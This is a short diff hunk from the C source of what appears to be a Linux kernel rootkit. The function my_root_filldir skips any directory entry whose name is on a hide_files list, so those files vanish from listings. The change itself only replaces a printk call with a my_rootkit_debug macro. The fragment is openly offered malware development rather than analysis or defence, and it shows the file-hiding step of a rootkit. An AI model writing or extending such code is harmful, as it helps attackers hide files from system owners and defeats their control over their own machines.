@@ -110,7 +110,7 @@ static int my_root_filldir(void *buf, const char *name, int nlen, loff_t off, in
 		if (name) {
 			list_for_each_entry(hf, &hide_files, list) {
 				if (!strcmp(hf->name, name)) {
-					printk(KERN_INFO "successfully hide %s\n", name);
+					my_rootkit_debug("successfully hide %s\n", name);
 					return 0;
 				}
 			}
